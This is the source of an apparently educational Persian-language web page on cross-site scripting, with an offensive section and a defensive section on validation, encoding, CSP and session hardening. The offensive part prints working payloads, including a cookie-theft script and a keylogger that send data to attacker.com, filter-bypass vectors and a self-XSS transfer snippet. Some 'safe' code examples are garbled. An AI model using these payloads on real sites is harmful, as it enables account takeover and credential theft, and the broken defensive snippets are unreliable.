---
import MainLayout from '../layouts/MainLayout.astro';
---
<MainLayout title="Cross-Site Scripting (XSS)">
<div class="page-container">
  <h1 class="page-header">Cross-Site Scripting (XSS)</h1>
  
  <div class="content-card">
    <div class="content-title" dir="rtl">XSS چیست؟</div>
    <ul class="content-list" dir="rtl">
      <li>اسکریپت نویسی بین سایتی (XSS) یک آسیب پذیری سمت کلاینت است که در آن مهاجمان اسکریپت های مخرب را به صفحات وب مشاهده شده توسط سایر کاربران تزریق می کنند.</li>
      <li> XSS می تواند برای سرقت توکن های نشست، تغییر ظاهر وب سایت ها، هدایت کاربران، انجام اقدامات از طرف کاربران و انجام حملات دیگر در مرورگر کاربران استفاده شود.</li>
    </ul>
  </div>
  
  <div class="content-card">
    <div class="content-title" dir="rtl">شدت تأثیر XSS:</div>
    <ul class="content-list" dir="rtl">
      <li>سرقت نشست (دزدیدن کوکی‌ها)</li>
      <li>تصاحب حساب کاربری</li>
      <li>ضبط کلیدها و فیشینگ</li>
      <li>توزیع بدافزار</li>
      <li>تغییر ظاهر وبسایت</li>
      <li>دسترسی به شبکه داخلی (از طریق مرورگر)</li>
    </ul>
  </div>
  
  <h2 class="TeamRed-title">Red Team Techniques (Offensive)</h2>
  
  <div class="content-card">
    <div class="content-subtitle-red">1. Reflected XSS</div>
    <p class="content-text" dir="rtl">
        XSS انعکاسی زمانی رخ می‌دهد که اسکریپت‌های مخرب به یک برنامه کاربردی آسیب‌پذیر تزریق شده و بلافاصله در پاسخ منعکس می‌شوند. این حملات نیاز به مهندسی اجتماعی دارند تا قربانیان را فریب دهند تا payload را اجرا کنند، معمولاً از طریق ایمیل‌های فیشینگ یا لینک‌های مخرب.
    </p>
    
    <div class="content-label">Basic Payload:</div>
    <pre class="code-block">http://example.com/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>
    <p class="content-note" dir="rtl">اثبات مفهوم ساده که اجرای اسکریپت در مرورگر قربانی را نشان می‌دهد</p>
    
    <div class="red-card">
      <div class="content-title">Bypass Techniques and Obfuscation:</div>
      <ul class="content-list">
        <li>
          <strong>تغییر حروف:</strong> &lt;SCRiPt&gt;alert(1)&lt;/script&gt;<br>
          فیلترهای حساس به حروف بزرگ و کوچک را دور می‌زند
        </li>
        <li>
          <strong>کدگذاری HTML:</strong><br>
          <pre class="code-block">&lt;img src=x onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'&gt;</pre>
          از تطابق الگوی پایه جلوگیری می‌کند
        </li>
        <li>
          <strong>پروتکل جعلی جاوااسکریپت:</strong> javascript:alert(document.cookie)<br>
          در ویژگی‌های href و هندلرهای رویداد کار می‌کند
        </li>
        <li>
          <strong>کدگذاری یونیکد:</strong> &lt;img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)"&gt;<br>
          فیلترهای مبتنی بر کلمه کلیدی را دور می‌زند
        </li>
      </ul>
    </div>
    
    <div class="content-label">Delivery Methods:</div>
    <ul class="content-list" dir="rtl">
      <li>ایمیل‌های فیشینگ حاوی لینک‌های مخرب</li>
      <li>URL های کوتاه شده که پیلود را پنهان می‌کنند</li>
      <li>وبسایت‌های به خطر افتاده که به نقاط آسیب‌پذیر هدایت می‌کنند</li>
      <li>QR کدهای مخرب</li>
    </ul>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-red">2. Stored XSS (Persistent XSS)</div>
    
    <p class="content-text" dir="rtl">
        XSS ذخیره شده زمانی رخ می‌دهد که اسکریپت‌های مخرب به صورت دائمی در سرور هدف ذخیره شده و به تمام بازدیدکنندگان ارائه می‌شوند. این نوع خطرناک‌تر از XSS انعکاسی است زیرا نیازی به مهندسی اجتماعی ندارد و می‌تواند بر چندین قربانی تأثیر بگذارد.
    </p>
    
    <div class="content-label">Cookie Theft Payload:</div>
    <pre class="code-block"><code>{`
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      url: window.location.href,
      userAgent: navigator.userAgent
    }),
    mode: 'no-cors',
    credentials: 'include'
  });
</script>
`.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code></pre>
    <p class="content-note" dir="rtl">جمع‌آوری جامع اعتبار شامل کوکی‌های نشست</p>
    
    <div class="content-label">Advanced Keylogger:</div>
    <pre class="code-block"><code>{`
<script>
  const loggedKeys = [];
  const targetForms = ["login", "payment", "password"];

  document.addEventListener("keypress", (e) => {
    loggedKeys.push({
      key: e.key,
      time: new Date().toISOString(),
      target: e.target.id || e.target.name
    });
  });

  setInterval(() => {
    if (loggedKeys.length > 0) {
      fetch("https://attacker.com/log", {
        method: "POST",
        body: JSON.stringify(loggedKeys.splice(0)),
        mode: "no-cors"
      });
    }
  }, 5000);
</script>
`.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code></pre>
    <p class="content-note" dir="rtl">ضبط کلیدها با اطلاعات زمینه‌ای و زمانی</p>
    
    <div class="content-label" dir="rtl">نقاط تزریق رایج:</div>
    <ul class="content-list" dir="rtl">
      <li>محتوای تولید شده توسط کاربر: نظرات، پست‌های انجمن، بررسی محصولات
        <ul class="nested-list">
          <li>اغلب به دلیل ویرایشگرهای متن غنی یا ضدعفونی نامناسب آسیب‌پذیر هستند</li>
        </ul>
      </li>
      <li>پروفایل‌های کاربری: نام‌های نمایشی، بیوها، آدرس‌های آواتار
        <ul class="nested-list">
          <li>فیلدهای پروفایل ممکن است بدون فرار مناسب به سایر کاربران نمایش داده شوند</li>
        </ul>
      </li>
      <li>رابط‌های مدیریتی: نمایشگرهای لاگ، پیام‌های سیستم
        <ul class="nested-list">
          <li>در صورت نمایش لاگ‌ها یا ورودی کاربر بدون ضدعفونی ممکن است آسیب‌پذیر باشند</li>
        </ul>
      </li>
    </ul>
    
    <div class="red-card">
      <div class="content-label">Persistence Techniques:</div>
      <ul class="content-list" dir="rtl">
        <li>ذخیره پیلودها در فیلدهای پایگاه داده که به سایر کاربران نمایش داده می‌شود</li>
        <li>آلوده کردن صفحات کش شده یا منابع استاتیک</li>
        <li>سوء استفاده از قابلیت آپلود فایل برای ذخیره اسکریپت‌های مخرب</li>
        <li>سوء استفاده از قالب‌ها یا ویجت‌های CMS</li>
      </ul>
    </div>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-red">3. DOM-Based XSS</div>
    
    <p class="content-text" dir="rtl">
        DOM XSS زمانی رخ می‌دهد که جاوااسکریپت سمت کلاینت، داده‌های قابل کنترل توسط مهاجم را بدون ضدعفونی مناسب به سینک‌های خطرناک می‌نویسد. برخلاف انواع دیگر XSS، DOM XSS کاملاً در سمت کلاینت است و سرور را درگیر نمی‌کند.
    </p>
    
    <div class="content-label">Location.hash Vulnerability:</div>
    <pre class="code-block">// کد آسیب‌پذیر در برنامه:
document.getElementById('content').innerHTML =
    decodeURIComponent(window.location.hash.substring(1));

// اکسپلویت URL:
https://example.com/#&lt;img src=x onerror=alert(1)&gt;</pre>
    <p class="content-note" dir="rtl">مقدار هش کنترل شده توسط کاربر مستقیماً به innerHTML نوشته شده است</p>
    
    <div class="content-label">Common Dangerous Sinks:</div>
    <table class="content-table">
      <thead>
        <tr>
          <th>Sink</th>
          <th>Risk</th>
          <th>Example</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>innerHTML</td>
          <td>High</td>
          <td>element.innerHTML = userInput</td>
        </tr>
        <tr>
          <td>document.write()</td>
          <td>High</td>
          <td>document.write('&lt;div&gt;' + input + '&lt;/div&gt;')</td>
        </tr>
        <tr>
          <td>eval()</td>
          <td>Critical</td>
          <td>eval('alert("' + input + '")')</td>
        </tr>
        <tr>
          <td>location</td>
          <td>Medium</td>
          <td>location.href = 'javascript:' + input</td>
        </tr>
      </tbody>
    </table>
    
    <div class="content-label" dir="rtl">چالش‌های تشخیص:</div>
    <ul class="content-list" dir="rtl">
      <li>هیچ پیلود سمت سروری برای تشخیص وجود ندارد (کاملاً سمت کلاینت)</li>
      <li>ممکن است فقط در حالت‌های خاص DOM فعال شود</li>
      <li>تشخیص آن در آنالیز استاتیک دشوار است</li>
      <li>اغلب نیاز به تست دینامیک با ابزارهایی مانند DOM Invader دارد</li>
    </ul>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-red">4. Self-XSS</div>
    
    <p class="content-text" dir="rtl">
        Self-XSS یک حمله مهندسی اجتماعی است که در آن قربانی فریب می‌خورد تا اسکریپت‌های مخرب را در کنسول مرورگر خود اجرا کند. اگرچه این حمله مستقیماً از آسیب‌پذیری در برنامه سوءاستفاده نمی‌کند، اما می‌تواند منجر به تصاحب حساب، سرقت داده‌ها یا نصب بدافزار با سوءاستفاده از اعتماد و دسترسی کاربر شود.
    </p>
    
    <div class="content-label">Example Scenario:</div>
    <pre class="code-block">{`// Message shown in phishing
"Paste this code to get free credits!"

// Malicious code:
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ 
    amount: 5000,
    to: 'attacker'
  }),
  credentials: 'include'
})`}</pre>
    <p class="content-note" dir="rtl">حقه کاربران را متقاعد می‌کند که درخواست‌های مخرب را با استفاده از نشست خودشان اجرا کنند.</p>
    
    <div class="red-card" dir="rtl">
      <div class="content-label">چرا کار میکند؟</div>
      <ul class="content-list">
        <li>کاربر احراز هویت شده و دارای مجوزهای بالاتر است (مانند دسترسی ادمین یا پرداخت).</li>
        <li>جاوااسکریپت در زمینه نشست کاربر و دامنه اجرا می‌شود.</li>
        <li>پلتفرم‌های مبتنی بر اعتماد (مانند سایت‌های بازی یا کریپتو) معمولاً هدف قرار می‌گیرند.</li>
      </ul>
    </div>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-red">5. Mutated XSS (mXSS)</div>
    
    <p class="content-text" dir="rtl">
        Mutated XSS زمانی رخ می‌دهد که ورودی‌هایی که به ظاهر بی‌خطر هستند، توسط مرورگر یا تجزیه‌کننده DOM به جاوااسکریپت قابل اجرا تبدیل می‌شوند. برخلاف XSS سنتی، پیلود اصلی در ابتدا خطرناک به نظر نمی‌رسد - تنها پس از تفسیر توسط مرورگر مخرب می‌شود. این ویژگی باعث می‌شود mXSS تشخیص و فیلتر کردنش دشوار باشد.
    </p>
    
    <div class="content-label">Example Payload:</div>
    <pre class="code-block">&lt;svg&gt;&lt;desc&gt;&amp;lt;script&amp;gt;alert(1)%lt;/script&amp;gt;&lt;/desc&gt;&lt;/svg&gt;</pre>
    <p class="content-note" dir="rtl">ورودی در حالت ذخیره شده بی‌خطر به نظر می‌رسد، اما توسط مرورگر بازتفسیر شده و به عنوان اسکریپت اجرا می‌شود.</p>
    
    <div dir="rtl">
      <div class="content-label">چرا کار میکند؟</div>
      <ul class="content-list">
        <li>مرورگر HTML نادرست را "اصلاح" می‌کند و عناصر DOM را متفاوت از آنچه مورد نظر است بازسازی می‌کند.</li>
        <li>ساختار تغییر یافته عناصر قابل اجرا مانند &lt;script&gt; یا هندلرهای رویداد را معرفی می‌کند.</li>
        <li>فیلترهای سمت سرور ممکن است ورودی‌هایی را تأیید کنند که تنها پس از تجزیه DOM خطرناک می‌شوند.</li>
      </ul>
    </div>
    
    <div class="red-card" dir="rtl">
      <div class="content-label">راه کارهای تشخیص:</div>
      <ul class="content-list">
        <li>از ابزارهای بررسی زنده DOM (مانند Chrome DevTools) استفاده کنید تا ببینید مرورگر واقعاً چه چیزی رندر می‌کند.</li>
        <li>تزریق را در تگ‌های غیراستاندارد مانند &lt;svg&gt;، &lt;math&gt; یا &lt;foreignObject&gt; آزمایش کنید.</li>
        <li>ابزارهایی مانند DOMPurify ممکن است در صورت پیکربندی نادرست در برابر mXSS محافظت نکنند.</li>
        <li>به تبدیل موجودیت‌های HTML به تگ‌های واقعی توجه کنید.</li>
      </ul>
    </div>
    
    <div class="content-label">Common mXSS Vectors:</div>
    <pre class="code-block">&lt;svg&gt;&lt;desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/desc&gt;&lt;/svg&gt;
&lt;math href="javascript:alert(1)"&gt;&lt;/math&gt;
&lt;title&gt;&amp;lt;script&amp;gt;alert(1)%lt;/script&amp;gt;&lt;/title&gt;</pre>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-red">XSS Tools & Automation</div>
    
    <div dir="rtl">
      <div class="content-label">کشف و اسکن:</div>
      <ul class="content-list">
        <li><a href="https://github.com/s0md3v/XSStrike" class="content-link" target="_blank" rel="noopener noreferrer">XSStrike</a> - ابزار پیشرفته تشخیص و فازینگ XSS</li>
        <li><a href="https://github.com/projectdiscovery/katana" class="content-link" target="_blank" rel="noopener noreferrer">Katana</a> - خزنده وب که نقاط انتهایی جاوااسکریپت را تشخیص می‌دهد</li>
        <li><a href="https://github.com/hahwul/dalfox" class="content-link" target="_blank" rel="noopener noreferrer">DalFox</a> - اسکنر سریع و قدرتمند XSS طراحی شده برای اتوماسیون</li>
        <li><a href="https://portswigger.net/burp" class="content-link" target="_blank" rel="noopener noreferrer">Burp Suite Scanner</a> - اسکن غیرفعال و فعال برای XSS انعکاسی/ذخیره شده</li>
        <li><a href="https://www.zaproxy.org/" class="content-link" target="_blank" rel="noopener noreferrer">OWASP ZAP</a> - اسکنر منبع باز با قابلیت‌های تست XSS</li>
      </ul>
      
      <div class="content-label">اکسپلویت و تولید پیلود:</div>
      <ul class="content-list">
        <li><a href="https://github.com/s0md3v/XSStrike" class="content-link" target="_blank" rel="noopener noreferrer">XSStrike</a> - ساخت پیلود با آگاهی از زمینه و تکنیک‌های دور زدن</li>
        <li><a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" class="content-link" target="_blank" rel="noopener noreferrer">XSS-Polyglots</a> - مجموعه‌ای از پیلودها برای زمینه‌های مختلف (DOM، HTML، JS)</li>
        <li><a href="https://github.com/payloadbox/xss-payload-list" class="content-link" target="_blank" rel="noopener noreferrer">PayloadBox</a> - مخزن پیلودهای آماده استفاده XSS</li>
        <li><a href="https://portswigger.net/burp/documentation/desktop/tools/repeater" class="content-link" target="_blank" rel="noopener noreferrer">Burp Repeater</a> - تست دستی و تزریق پیلود</li>
      </ul>
      
      <div class="content-label">پس از اکسپلویت و گزارش‌دهی:</div>
      <ul class="content-list">
        <li><a href="https://beefproject.com/" class="content-link" target="_blank" rel="noopener noreferrer">BeEF</a> - چارچوب اکسپلویت مرورگر برای اتصال و کنترل پس از XSS</li>
        <li><a href="https://xsshunter.com/" class="content-link" target="_blank" rel="noopener noreferrer">XSS Hunter</a> - اجرای پیلودهای XSS را با پاسخ‌های خارج از باند ردیابی و ثبت می‌کند</li>
        <li>هشدارهای سفارشی و تحویل وب‌هوک برای استخراج داده یا اثبات مفهوم</li>
        <li><a href="https://portswigger.net/burp/documentation/desktop/scanning/reporting" class="content-link" target="_blank" rel="noopener noreferrer">Burp Suite</a> - گزینه‌های تولید و صدور گزارش</li>
      </ul>
    </div>
  </div>
  
  <!-- Blue Team Defenses (Defensive) Section -->
  <h2 class="TeamBlue-title">Blue Team Defenses (Defensive)</h2>
  
  <div class="content-card">
    <div class="content-subtitle-blue">1. Input Handling & Validation</div>
    <p class="content-text" dir="rtl">
        مدیریت صحیح ورودی اولین خط دفاعی در برابر حملات XSS است. یک استراتژی اعتبارسنجی چندلایه اطمینان می‌دهد که تنها داده‌های تمیز و مورد انتظار وارد برنامه شما می‌شوند.
    </p>
    
    <div class="content-label" dir="rtl">استراتژی جامع اعتبارسنجی:</div>
    <ul class="content-list">
      <li>
        <strong>Allowlist Validation:</strong>
        <pre class="code-block">// فقط حروف الفبا، اعداد و علائم نگارشی پایه مجاز است
// Only allow alphanumeric plus basic punctuation
const isValid = /^[a-zA-Z0-9 .,!?-]+$/.test(input);</pre>
        <p class="content-note" dir="rtl">ورودی نامعتبر را رد کنید نه اینکه آن را پاکسازی کنید</p>
      </li>
      <li dir="rtl">
        <strong>بررسی نوع و طول:</strong>
        <ul class="nested-list">
          <li>اعمال حداکثر طول برای تمام فیلدها</li>
          <li>اعتبارسنجی نوع داده (اعداد، ایمیل‌ها و غیره)</li>
          <li>پیاده‌سازی اعتبارسنجی منطق کسب‌وکار</li>
        </ul>
      </li>
      <li dir="rtl">
        <strong>قوانین خاص زمینه:</strong>
        <ul class="nested-list">
          <li>قوانین متفاوت برای نام در مقابل آدرس در مقابل محتوای HTML</li>
          <li>مدیریت ویژه برای ورودی‌های ویرایشگر متن غنی</li>
        </ul>
      </li>
    </ul>
    
    <div class="content-label">Trusted Sanitization Libraries:</div>
    <table class="content-table">
      <thead>
        <tr>
          <th>کتابخانه</th>
          <th>زبان</th>
          <th>ویژگی‌های کلیدی</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>DOMPurify</td>
          <td>JavaScript</td>
          <td>پاک‌ساز HTML با لیست‌های سفید قابل تنظیم</td>
        </tr>
        <tr>
          <td>OWASP Java Encoder</td>
          <td>Java</td>
          <td>رمزگذاری آگاه از زمینه برای چندین زمینه خروجی</td>
        </tr>
        <tr>
          <td>HTMLSanitizer</td>
          <td>.NET</td>
          <td>پاک‌ساز HTML قابل پیکربندی با لیست‌های ایمن</td>
        </tr>
        <tr>
          <td>bleach</td>
          <td>Python</td>
          <td>پاک‌ساز HTML مبتنی بر لیست سفید</td>
        </tr>
      </tbody>
    </table>
    
    <div class="blue-card" dir="rtl">
      <div class="content-label">چک‌لیست پیاده‌سازی:</div>
      <ul class="content-list">
        <li>اعتبارسنجی هم در سمت کلاینت و هم در سمت سرور</li>
        <li>نرمال‌سازی ورودی قبل از اعتبارسنجی (یونیکد، رمزگذاری)</li>
        <li>ثبت شکست‌های اعتبارسنجی برای نظارت</li>
        <li>به‌روزرسانی منظم الگوهای اعتبارسنجی</li>
      </ul>
    </div>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-blue">2. Output Encoding & Context Awareness</div>
    
    <p class="content-text" dir="rtl">
        کدگذاری صحیح خروجی اطمینان می‌دهد که داده‌های ارائه شده توسط کاربر در زمینه‌های مختلف به صورت ایمن نمایش داده می‌شوند. نوع کدگذاری صحیح بستگی به جایی دارد که داده در آن قرار می‌گیرد.
    </p>
    
    <div class="content-label" dir="rtl">راهنمای کدگذاری بر اساس زمینه:</div>
    <table class="content-table">
      <thead>
        <tr>
          <th>زمینه</th>
          <th>روش کدگذاری</th>
          <th>مثال</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>بدنه HTML</td>
          <td>کدگذاری موجودیت HTML</td>
          <td>&amp;lt;script&amp;gt;</td>
        </tr>
        <tr>
          <td>ویژگی HTML</td>
          <td>کدگذاری ویژگی</td>
          <td>"&gt;&amp;script&gt;</td>
        </tr>
        <tr>
          <td>جاوااسکریپت</td>
          <td>کدگذاری جاوااسکریپت</td>
          <td>\x3cscript\x3e</td>
        </tr>
        <tr>
          <td>URL</td>
          <td>کدگذاری URL</td>
          <td>&amp;3cscript&amp;3E</td>
        </tr>
      </tbody>
    </table>
    
    <div class="content-label" dir="rtl">ویژگی‌های فرار خودکار فریمورک‌ها:</div>
    <ul class="content-list" dir="rtl">
      <li>
        <strong>React:</strong>
        <ul class="nested-list">
          <li>فرار خودکار JSX</li>
          <li>DangerouslySetInnerHTML برای HTML خام صریح</li>
        </ul>
      </li>
      <li>
        <strong>Angular:</strong>
        <ul class="nested-list">
          <li>پاک‌سازی قالب</li>
          <li>سرویس DomSanitizer برای موارد بایپس</li>
        </ul>
      </li>
      <li>
        <strong>Vue:</strong>
        <ul class="nested-list">
          <li>فرار خودکار در قالب‌ها</li>
          <li>دستور v-html برای HTML خام صریح</li>
        </ul>
      </li>
    </ul>
    
    <div class="blue-card">
      <div class="content-label">APIهای خطرناک که باید از آنها اجتناب کرد</div>
      <div class="grid-container">
        <div>
          <div class="text-red">الگوهای ناامن</div>
          <pre class="code-block">// UNSAFE PATTERNS
element.innerHTML = userData;    // تزریق مستقیم HTML
document.write(userInput);    // نوشتن در سند
eval(userControlLe4String);    // اجرای کد پویا
setTimeout(userInput);    // ارزیابی رشته
location.href = userControlledURL;    // URLهای جاوااسکریپت</pre>
        </div>
        <div>
          <div class="text-green">جایگزین‌های امن</div>
          <pre class="code-block">{`// SAFE ALTERNATIVES
element.textContent = userData;    // فقط متن
document.createElement();    // دستکاری DOM
Function('return ' + json()))
setTimeout(function() {...}, 0);    // ارجاع تابع
new URL(userInput).toString();    // URLهای تأیید شده`}</pre>
        </div>
      </div>
    </div>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-blue">3. Content Security Policy (CSP)</div>
    <p class="content-text" dir="rtl">سیاست امنیتی محتوا</p>
    <p class="content-text" dir="rtl">
        CSP یک لایه امنیتی اضافی ارائه می‌دهد که با محدود کردن منابع محتوای قابل اجرا، به کاهش حملات XSS کمک می‌کند. یک CSP به خوبی پیکربندی شده می‌تواند بسیاری از حملات XSS را حتی در صورت دور زدن سایر دفاعیات جلوگیری کند.
    </p>
    
    <div class="content-label" dir="rtl">پیکربندی بهینه CSP:</div>
    <pre class="code-block">Content-Security-Policy:
    default-src 'none';    # انکار پیش‌فرض
    script-src 'self' 'nonce-[random]';  # فقط اسکریپت‌های هم‌منبع + nonced
    style-src 'self' 'unsafe-inline';   # استایل‌های درون خطی مجاز
    img-src 'self' data;    # تصاویر از خود و URLهای داده
    connect-src 'self';    # XHR/fetch به منبع مشابه
    font-src 'self';    # فونت‌ها از منبع مشابه
    object-src 'none';    # بدون Flash/پلاگین
    frame-src 'none';    # بدون iframe
    base-uri 'self';    # محدود کردن URLهای پایه
    form-action 'self';    # اهداف ارسال فرم
    report-uri /csp-report;    # گزارش تخلف
    report-to csp-endpoint;    # استاندارد گزارش‌دهی جدید</pre>
    
    <div class="content-label" dir="rtl">استراتژی پیاده‌سازی CSP:</div>
    <ol class="content-list" dir="rtl">
      <li>شروع با حالت Report-Only:</li>
      <pre class="code-block">Content-Security-Policy-Report-Only: ...</pre>
      <li>استفاده از nonce یا hash برای اسکریپت‌های درون خطی:</li>
      <pre class="code-block">&lt;script nonce="IDMnf93nccif0fn39fnae9h3sdfa"&gt;
    // اسکریپت درون خطی مجاز توسط CSP
&lt;/script&gt;</pre>
      <li>محدود کردن object-src و frame-src به 'none':
        <p class="content-note" dir="rtl">از حملات مبتنی بر Flash و frame جلوگیری می‌کند</p>
      </li>
      <li>پیاده‌سازی گزارش‌دهی:
        <p class="content-note" dir="rtl">تخلفات را قبل از اجرا نظارت کنید</p>
      </li>
    </ol>
    
    <div class="blue-card" dir="rtl">
      <div class="content-label">چک‌لیست استقرار CSP:</div>
      <ul class="content-list">
        <li>تست با ابزار CSP Evaluator</li>
        <li>نظارت بر گزارش‌ها قبل از اجرا</li>
        <li>سفت‌کردن تدریجی خط‌مشی</li>
        <li>مستندسازی تمام استثناها</li>
        <li>بررسی خط‌مشی هر سه ماه</li>
      </ul>
    </div>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-blue">4. Secure Session Management</div>
    <p class="content-text" dir="rtl">مدیریت امن نشست‌ها</p>
    <p class="content-text" dir="rtl">
        مدیریت صحیح نشست‌ها با کاهش پنجره فرصت و محافظت از توکن‌های نشست حساس، تأثیر حملات موفق XSS را محدود می‌کند.
    </p>
    
    <div class="content-label" dir="rtl">ویژگی‌های امن کوکی:</div>
    <pre class="code-block">Set-Cookie:
    sessionId=abc123;
    Secure;    # فقط HTTPS
    HttpOnly;    # عدم دسترسی جاوااسکریپت
    SameSite=Lax;    # محافظت در برابر CSRF
    Path=/;    # دسترسی در کل سایت
    Domain=example.com;  # دامنه خاص
    Max-Age=3600;    # انقضا 1 ساعت
    Priority=High;    # دفاع در برابر CRIME</pre>
    
    <div class="content-label" dir="rtl">محافظت‌های پیشرفته نشست:</div>
    <ul class="content-list" dir="rtl">
      <li>
        <strong>نشست‌های کوتاه مدت:</strong>
        <ul class="nested-list">
          <li>وقفه‌های فعالیت 15-30 دقیقه‌ای</li>
          <li>حداکثر مطلق 4-8 ساعت</li>
        </ul>
      </li>
      <li>
        <strong>اعتبارسنجی زمینه‌ای:</strong>
        <ul class="nested-list">
          <li>اثر انگشت آدرس IP</li>
          <li>بررسی سازگاری User-Agent</li>
          <li>تأیید موقعیت جغرافیایی</li>
        </ul>
      </li>
      <li>
        <strong>بهترین روش‌های JWT:</strong>
        <ul class="nested-list">
          <li>زمان انقضای کوتاه (دقیقه نه ساعت)</li>
          <li>HMAC با رمزهای قوی</li>
          <li>ذخیره در کوکی‌های httpOnly (نه localStorage)</li>
        </ul>
      </li>
    </ul>
    
    <div class="blue-card" dir="rtl">
      <div class="content-label">چک‌لیست تقویت نشست:</div>
      <ul class="content-list">
        <li>پیاده‌سازی تمام پرچم‌های توصیه شده کوکی</li>
        <li>استفاده از چرخش نشست پس از ورود</li>
        <li>نیاز به احراز هویت مجدد برای اقدامات حساس</li>
        <li>نظارت بر نشست‌های همزمان</li>
        <li>پیاده‌سازی API خاتمه نشست</li>
      </ul>
    </div>
  </div>
  
  <div class="content-card">
    <div class="content-subtitle-blue">5. Monitoring & Incident Response</div>
    <p class="content-text" dir="rtl">نظارت و پاسخ به حوادث</p>
    <p class="content-text" dir="rtl">
        نظارت مؤثر، تلاش‌های XSS و حملات موفق را شناسایی می‌کند، در حالی که یک برنامه پاسخ به حوادث از پیش آماده شده، آسیب‌های ناشی از نقض امنیت را به حداقل می‌رساند.
    </p>
    
    <div class="content-label" dir="rtl">تکنیک‌های تشخیص:</div>
    <ul class="content-list" dir="rtl">
      <li>
        <strong>Web Application Firewalls (WAF)</strong>
        <ul class="nested-list">
          <li>تشخیص مبتنی بر امضا برای الگوهای XSS</li>
          <li>تحلیل رفتاری ورودی‌های مشکوک</li>
        </ul>
      </li>
      <li>
        <strong>Static Application Security Testing (SAST)</strong>
        <ul class="nested-list">
          <li>تحلیل کد برای الگوهای آسیب‌پذیر</li>
          <li>ادغام در خطوط CI/CD</li>
        </ul>
      </li>
      <li>
        <strong>Dynamic Analysis (DAST)</strong>
        <ul class="nested-list">
          <li>اسکن خودکار برنامه‌های در حال اجرا</li>
          <li>اسکن‌های برنامه‌ریزی شده منظم</li>
        </ul>
      </li>
    </ul>
    
    <div class="content-label" dir="rtl">برنامه پاسخ به حوادث:</div>
    <ol class="content-list" dir="rtl">
      <li>
        <strong>مهار:</strong>
        <ul class="nested-list">
          <li>حذف محتوای مخرب</li>
          <li>خاتمه اجباری نشست</li>
          <li>مسدود کردن منابع حمله</li>
        </ul>
      </li>
      <li>
        <strong>بررسی:</strong>
        <ul class="nested-list">
          <li>تحلیل پزشکی قانونی لاگ‌ها</li>
          <li>تعیین بردار حمله</li>
          <li>شناسایی کاربران آسیب‌دیده</li>
        </ul>
      </li>
      <li>
        <strong>رفع:</strong>
        <ul class="nested-list">
          <li>اصلاح آسیب‌پذیری‌ها</li>
          <li>چرخش اسرار</li>
          <li>به‌روزرسانی دفاعیات</li>
        </ul>
      </li>
      <li>
        <strong>ارتباطات:</strong>
        <ul class="nested-list">
          <li>اطلاع‌رسانی به کاربران آسیب‌دیده</li>
          <li>گزارش‌دهی داخلی</li>
          <li>تحلیل پس از حادثه</li>
        </ul>
      </li>
    </ol>
    
    <div class="blue-card" dir="rtl">
      <div class="content-label">بهبود مستمر:</div>
      <ul class="content-list">
        <li>آموزش امنیتی منظم برای توسعه‌دهندگان</li>
        <li>آزمایش نفوذ سه‌ماهه</li>
        <li>برنامه‌های باگ بانتی</li>
        <li>جلسات مدل‌سازی تهدید</li>
      </ul>
    </div>
  </div>
  
  <div class="content-card">
    <h2 class="content-subtitle-blue">XSS Mitigation Checklist</h2>
    <p class="content-label" dir="rtl">چک‌لیست کاهش خطرات احتمالی XSS</p>
    <ul class="content-list" dir="rtl">
      <li>پیاده‌سازی اعتبارسنجی سختگیرانه ورودی (رویکرد لیست سفید)</li>
      <li>استفاده از کدگذاری خروجی آگاه از زمینه</li>
      <li>استقرار سیاست امنیتی محتوا (CSP)</li>
      <li>تنظیم پرچم‌های HttpOnly و Secure برای کوکی‌ها</li>
      <li>استفاده از فریمورک‌های مدرن با حفاظت‌های داخلی</li>
      <li>اسکن منظم برای آسیب‌پذیری‌ها</li>
      <li>آموزش روش‌های کدنویسی ایمن به توسعه‌دهندگان</li>
    </ul>
  </div>
  
  <div class="content-card">
    <h2 class="content-subtitle">Additional Resources & References</h2>
    
    <div class="content-label">Learning Resources</div>
    <ul class="content-list">
      <li><a href="https://owasp.org/www-community/attacks/xss/" class="content-link" target="_blank" rel="noopener noreferrer">OWASP XSS — Complete documentation and examples</a></li>
      <li><a href="https://portswigger.net/web-security/cross-site-scripting" class="content-link" target="_blank" rel="noopener noreferrer">PortSwigger XSS Academy — Interactive labs</a></li>
      <li><a href="https://developers.google.com/web/fundamentals/security/csp" class="content-link" target="_blank" rel="noopener noreferrer">Google CSP Guide — Comprehensive CSP reference</a></li>
    </ul>
    
    <div class="content-label">Security Tools</div>
    <ul class="content-list">
      <li><a href="https://beefproject.com/" class="content-link" target="_blank" rel="noopener noreferrer">BeEF — Browser Exploitation Framework</a></li>
      <li><a href="https://xsshunter.com/" class="content-link" target="_blank" rel="noopener noreferrer">XSS Hunter — Blind XSS platform</a></li>
      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" class="content-link" target="_blank" rel="noopener noreferrer">OWASP XSS Prevention Cheat Sheet</a></li>
    </ul>
  </div>
</div>
</MainLayout>